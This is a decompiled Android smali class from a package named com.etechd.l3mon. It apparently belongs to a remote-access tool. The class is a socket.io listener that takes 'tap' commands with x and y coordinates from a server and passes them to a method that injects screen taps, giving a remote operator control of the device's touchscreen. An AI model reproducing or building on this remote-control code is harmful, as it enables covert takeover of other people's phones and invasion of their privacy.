.class final Lcom/etechd/l3mon/ConnectionManager$3;
.super Ljava/lang/Object;
.source "ConnectionManager.java"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;

# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/etechd/l3mon/ConnectionManager;->sendReq()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation

# direct methods
.method constructor <init>()V
    .locals 0
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

# virtual methods
.method public varargs call([Ljava/lang/Object;)V
    .locals 6
    .param p1, "args"    # [Ljava/lang/Object;

    const/4 v0, 0x0
    :try_start_0
    aget-object v1, p1, v0
    check-cast v1, Lorg/json/JSONObject;

    const-string v2, "type"
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;
    move-result-object v3

    const-string v4, "tap"
    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v5
    if-eqz v5, :done

    const-string v2, "x"
    invoke-virtual {v1, v2}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I
    move-result v2
    const-string v3, "y"
    invoke-virtual {v1, v3}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I
    move-result v3
    invoke-static {v2, v3}, Lcom/etechd/l3mon/ConnectionManager;->INP(II)V
    :done
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    return-void
.end method
